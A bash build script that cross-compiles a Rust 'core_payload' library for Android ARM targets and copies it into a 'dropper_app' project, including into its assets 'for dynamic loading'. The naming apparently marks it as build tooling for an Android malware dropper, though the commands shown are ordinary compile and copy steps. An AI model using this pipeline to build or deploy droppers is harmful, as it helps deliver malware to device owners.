#!/bin/bash

set -e

echo "Building Hermes Spectre Edition for Android..."

# Build the Rust core payload for Android
echo "Building core payload..."
cd "$(dirname "$0")/core_payload"

# Set up environment for cross-compilation with OpenSSL
export OPENSSL_DIR="$HOME/.openssl-android"

# Check if OpenSSL for Android is already set up
if [ ! -d "$OPENSSL_DIR" ]; then
    echo "Setting up OpenSSL for Android cross-compilation..."
    mkdir -p "$OPENSSL_DIR"
    
    # For this demo, we'll use a feature flag to disable SSL
    echo "Note: Using no-default-features to bypass OpenSSL requirement"
fi

# Check if cargo-ndk is installed
if ! command -v cargo-ndk &> /dev/null; then
    echo "cargo-ndk not found, installing..."
    cargo install cargo-ndk
fi

# Build for Android targets
echo "Building for ARM64..."
cargo ndk -t arm64-v8a build --release --no-default-features

echo "Building for ARM32..."
cargo ndk -t armeabi-v7a build --release --no-default-features

# Copy the compiled libraries to the Android project
echo "Copying libraries to Android project..."
mkdir -p "../dropper_app/app/src/main/jniLibs/arm64-v8a"
mkdir -p "../dropper_app/app/src/main/jniLibs/armeabi-v7a"

# Copy the Rust shared libraries (.so)
cp "./target/aarch64-linux-android/release/libcore_payload.so" "../dropper_app/app/src/main/jniLibs/arm64-v8a/libcore_payload.so"
cp "./target/armv7-linux-androideabi/release/libcore_payload.so" "../dropper_app/app/src/main/jniLibs/armeabi-v7a/libcore_payload.so"

# Also copy to assets for dynamic loading
mkdir -p "../dropper_app/app/src/main/assets"
cp "./target/aarch64-linux-android/release/libcore_payload.so" "../dropper_app/app/src/main/assets/core_payload.so"

# Skip Android app build for now since we're focusing on the core payload
echo "Skipping Android app build for now..."
echo "Core payload libraries have been successfully built and copied to the Android project."

echo "Build completed successfully!"
echo "Core payload libraries are in the dropper_app/app/src/main/jniLibs/ directory."